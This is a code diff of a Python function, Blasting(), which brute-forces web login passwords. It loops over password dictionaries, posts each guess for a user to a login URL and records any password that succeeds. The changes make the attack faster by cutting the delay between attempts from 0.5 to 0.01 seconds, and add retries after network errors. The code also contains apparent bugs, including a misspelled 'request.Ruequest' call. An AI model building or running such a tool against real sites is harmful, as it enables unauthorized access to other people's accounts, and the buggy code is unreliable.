@@ -75,11 +75,14 @@ def Blasting():
 				data['passwd'] = x[:-1]
 				req = request.Request(url, headers = head)
 				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
-				time.sleep(0.5)
+				time.sleep(0.01)
 				try :
 					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
 				except error.HTTPError as e:
 					req = request.Ruequest(response.geturl(), headers = head)
+					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
+				except error.URLError as e:
+					time.sleep(10)
 					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
 				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
 					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
@@ -93,11 +96,14 @@ def Blasting():
 				data['passwd'] = x[:-1]
 				req = request.Request(url, headers = head)
 				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
-				time.sleep(0.5)
+				time.sleep(0.01)
 				try :
 					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
 				except error.HTTPError as e:
 					req = request.Ruequest(response.geturl(), headers = head)
+					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
+				except error.URLError as e:
+					time.sleep(10)
 					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
 				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
 					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
@@ -112,12 +118,15 @@ def Blasting():
 			for x in MaleDictionary():
 				data['passwd'] = x
 				req = request.Request(url, headers = head)
-				time.sleep(0.5)
 				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
+				time.sleep(0.01)
 				try :
 					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
 				except error.HTTPError as e:
 					req = request.Ruequest(response.geturl(), headers = head)
+					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
+				except error.URLError as e:
+					time.sleep(10)
 					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
 				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
 					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
@@ -131,11 +140,14 @@ def Blasting():
 				data['passwd'] = x
 				req = request.Request(url, headers = head)
 				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
-				time.sleep(0.5)
+				time.sleep(0.01)
 				try :
 					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
 				except error.HTTPError as e:
 					req = request.Ruequest(response.geturl(), headers = head)
+					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
+				except error.URLError as e:
+					time.sleep(10)
 					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
 				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
 					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
